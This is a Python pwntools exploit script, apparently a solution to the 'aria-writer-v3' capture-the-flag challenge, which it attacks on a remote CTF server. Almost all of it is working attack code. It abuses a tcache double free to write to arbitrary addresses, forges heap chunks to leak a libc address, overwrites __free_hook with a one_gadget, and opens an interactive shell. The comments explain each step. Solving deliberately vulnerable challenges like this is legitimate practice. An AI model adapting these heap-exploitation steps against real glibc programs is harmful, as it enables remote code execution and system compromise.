#!/usr/bin/python

from pwn import *

my_elf = ELF('./aria-writer-v3')
libc_elf = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

# conn = process('./aria-writer-v3');
conn = remote("pwn.hsctf.com", 2468)

def malloc(length, value):
    conn.recvuntil("2) throw it away")
    conn.send("1" + '\0' * 3)
    payload = str(length)
    conn.send(payload + '\0' * (4 - len(payload)))
    if (len(value) < length):
        conn.send(value + '\n')
    else:
        conn.send(value)
    conn.recvuntil("what should i write tho >")

def free():
    conn.recvuntil("2) throw it away")
    conn.send("2" + '\0' * 3)

def get_secret():
    conn.recvline()
    pattern = "! rob needs your help composing an aria"
    output = conn.recvuntil(pattern)
    output = output[:-len(pattern)]
    output = output + '\0' * (8 - len(output))
    value = u64(output)
    return value

def tcache_write(block_size, target, new_value):
    '''
    Exploits tcache double free to write into arbitary location

    Args:
        block_size - size of memory block to be allocated
        target - target address to be overwritten
        new_value - the value to be written to target address
    '''
    malloc(block_size, '')
    free()
    free()
    malloc(block_size, p64(target))
    malloc(block_size, '')
    malloc(block_size, new_value)

# 1. prepare the chunk header for the forged chunk with size of 0x420
#    0x421 will be read into address 0x602048
conn.send(p64(0x421) + '\n')

name = 0x602040

# 2. forge small chunks at 'name + 0x420' to satisify unsorted bin conditions
tcache_write(0x60, name + 0x420, p64(0)+p64(0x21)+'c'*0x10+p64(0x20)+p64(0x21))

# 3. instantiate chunk 0x602050 with 0x420 bytes
tcache_write(0x70, name + 0x10, '')

# 4. chunk 0x602050 is now in the unsorted bin and will point to main_arena
#    we can't see the libc address yet because of the \x00 in the 64-bit '0x421'
free()

# 5. This request will be served from the unsorted bin and split chunk 0x602050
#    After the allocation, the memory layout will be:
#       0x602040 -> 0x602050        0x0021              [chunk_header for 0x10 alloc]
#       0x602050 -> xxxxxxxx        main_arena+0x50
#       0x602060 -> 0x602040        0x0401              [chunk_header for the remainder]
#       0x602070 -> main_arena+0x60 main_arena+0x60
malloc(0x10, '')

# 6. overwrite 0x602040-0x602057 with non-zero values.
#    0x17 is used to accommodate \n at the end.
#    so total bytes written is exactly 0x18.
#    This will expose main_arena+0x50 at 0x602058
tcache_write(0x30, name, 'a' * 0x17)

# 7. read libc address
libc_address = get_secret() - 0x3ec090
print(hex(libc_address))

# 8. set __free_hook to one_gadget
free_hook = libc_elf.symbols['__free_hook'] + libc_address
one_gadget = 0x4f322    #[rsp+0x40] == NULL
tcache_write(0x90, free_hook, p64(libc_address + one_gadget))

# 9. get the shell - free() will drop into free_hook, which is set to one_gadget
free()
conn.interactive()
